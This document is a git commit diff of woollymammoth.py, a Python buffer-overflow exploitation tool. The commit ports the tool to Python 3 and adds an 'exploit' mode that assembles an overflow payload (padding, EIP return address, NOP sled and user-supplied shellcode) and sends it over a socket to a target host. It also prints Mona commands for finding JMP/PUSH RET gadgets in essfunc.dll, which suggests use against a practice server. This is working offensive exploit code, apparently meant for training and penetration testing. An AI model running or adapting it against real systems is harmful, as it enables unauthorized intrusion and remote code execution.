920ff17dfd079c5aef7edc3d8c4a985718956394
Adam <ins1gn1a@users.noreply.github.com>
2019-08-27 18:40:42 +0100

    Update woollymammoth.py

--- woollymammoth.py
+++ woollymammoth.py
@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 import socket
 import os
@@ -25,25 +25,32 @@ offset = subparser.add_parser('offset', help='Sending unique string pattern to i
 eip = subparser.add_parser('eip', help='Enter the offset pattern hex string to identify the offset value.')
 exploit = subparser.add_parser('exploit', help='Create buffer-overflow exploit on the command line with optional prefix.')
 
-
 #fuzz.add_argument('--fuzz','-f',help='Fuzz value (using optional prefix)',action='store_true',required=False,default=False,dest='fuzz')
-fuzz.add_argument('--prefix',help='Enter the prefix for the command',required=False,dest='prefix',default="")
-fuzz.add_argument('--target','-t',help='Enter the target host IP address',required=True,default="",dest='target')
-fuzz.add_argument('--port','-p',help='Enter the target port number',required=True,dest='port',type=int)
+fuzzRequired = fuzz.add_argument_group('Required Arguments')
+fuzzRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
+fuzzRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
+fuzz.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")
 
 #offset.add_argument('--offset','-o',help='Send offset pattern string',action='store_true',required=False,default=False,dest='offset')
-offset.add_argument('--prefix',help='Enter the prefix for the command',required=False,dest='prefix',default="")
-offset.add_argument('--target','-t',help='Enter the target host IP address',required=True,default="",dest='target')
-offset.add_argument('--port','-p',help='Enter the target port number',required=True,dest='port',type=int)
+offsetRequired = offset.add_argument_group('Required Arguments')
+offsetRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
+offsetRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
+offset.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")
 
-eip.add_argument('--eip','-e',help='Enter the EIP value to identify offset code',required=True,default="",dest='eip')
+eipRequired = eip.add_argument_group('Required Arguments')
+eipRequired.add_argument('--eip','-e',help='Enter the EIP value to identify offset code.',required=True,default="",dest='eip')
+
+
+exploitRequired = exploit.add_argument_group('Required Arguments')
+exploitRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
+exploitRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
+exploitRequired.add_argument('--eip','-e',help='Enter the EIP JMP/PUSH;RET address as assembly shellcode.',required=True,dest='eip',default="",type=str)
+exploitRequired.add_argument('--offset','-o',help='Enter the EIP offset value as an integer.',required=True,dest='offset',type=int,default="")
+exploitRequired.add_argument('--shellcode','-s',help='Enter the shellcode for the exploit.',required=True,dest='shellcode',type=str)
+exploit.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")
+exploit.add_argument('--nops','-n',help='Enter the number of NOPs to send as an integer (default: 10).',required=False,dest='nops',default=10,type=int)
 
 args = parser.parse_args()
-
-def delete_last_lines(n=1):
-    for _ in range(n):
-        sys.stdout.write(CURSOR_UP_ONE)
-        sys.stdout.write(ERASE_LINE)
 
 def PrintGreen(text):
     return (Fore.GREEN + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)
@@ -86,9 +93,6 @@ def main():
     bufRan = ""
     bufStart = 100
 
-    CURSOR_UP_ONE = '\x1b[1A'
-    ERASE_LINE = '\x1b[2K'
-
     upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
     lower = "abcdefghijklmnopqrstuvwxyz"
     number = "0123456789"
@@ -109,15 +113,16 @@ def main():
                 s.connect((host, port))
                 s.settimeout(3)
                 x = s.recv(1024)
-                s.send(buffer)
+                s.send(buffer.encode())
                 bufLength = (len(buffer) - len(args.prefix))
                 prevBufLength = bufLength
-                delete_last_lines()
-                print(PrintBlue("[i]") + " Fuzzing:\t\t" + str(bufLength) + " Bytes")
+                #delete_last_lines()
+                print(PrintBlue("[i]") + " Fuzzing:\t\t" + str(bufLength) + " Bytes", end='\r')
                 s.close()
                 sleep(0.5)
                 bufStart += 100
             except:
+                print (sys.exc_info())
                 print ("\nInformation:")
                 print (PrintGreen("[+]") + " Server crashed between " + str(prevBufLength) + " and %s Bytes" % str(len(buffer) - len(args.prefix)))
                 print (PrintRed("[!]") + " Send offset pattern using '-o' to identify EIP offset")
@@ -132,7 +137,7 @@ def main():
             s.connect((host, port))
             s.settimeout(3)
             x = s.recv(1024)
-            s.send(buffer)
+            s.send(buffer.encode())
             s.close()
             sleep(0.5)
             bufStart += 100
@@ -157,10 +162,23 @@ def main():
         print (PrintRed("[!]") + " Locate vulnerable libraries with Mona: !mona modules")
         print (PrintRed("[!]") + ' Identify valid JMP with Mona: !mona find -s "\\xff\\xe4" -m "essfunc.dll"')
         print (PrintRed("[!]") + ' Identify valid PUSH RET with Mona: !mona find -s "\\x5c\\xc3" -m "essfunc.dll"')
+        
+        
+    elif (args.subparser == "exploit"):
+        print (PrintBlue("[i]") + " EIP JMP/PUSH: \t" + str(args.eip))
+        print (PrintBlue("[i]") + " EIP Offset Length: \t" + str(args.offset))    
+        print (PrintBlue("[i]") + " NOPs: \t\t" + str(args.nops))    
+              
+        nops = b"\x90" * args.nops
+        
+        # very hacky method of getting shellcode to send over a socket from command line
+        #               Prefix                             Offset                                             EIP                                      NOPS                            Shellcode
+        buffer = args.prefix.strip().encode() + ("A" * int(args.offset)).encode() + bytearray([int(x, 16) for x in args.eip.split("\\x") if len(x)]) + nops + bytearray([int(x, 16) for x in args.shellcode.split("\\x") if len(x)])
 
-
-
-
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        s.send(buffer)
+        s.close()
 
 if __name__ == "__main__":
     main()
